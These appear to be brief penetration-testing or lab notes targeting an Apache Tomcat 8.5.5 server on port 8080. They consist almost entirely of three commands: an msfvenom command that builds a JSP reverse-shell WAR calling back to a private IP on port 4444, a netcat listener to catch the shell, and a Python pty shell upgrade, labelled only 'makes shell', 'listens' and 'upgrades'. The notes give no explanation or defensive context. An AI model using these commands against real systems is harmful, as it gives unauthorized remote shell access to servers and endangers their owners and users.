8080/tcp open http Apache Tomcat 8.5.5
| http-methods:




1. msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.232.84 LPORT=4444 -f war > shell.war
2. nc -lvp 4444
3. python -c 'import pty; pty.spawn("/bin/bash")'

1 - makes shell
2 - listens
3 - upgrades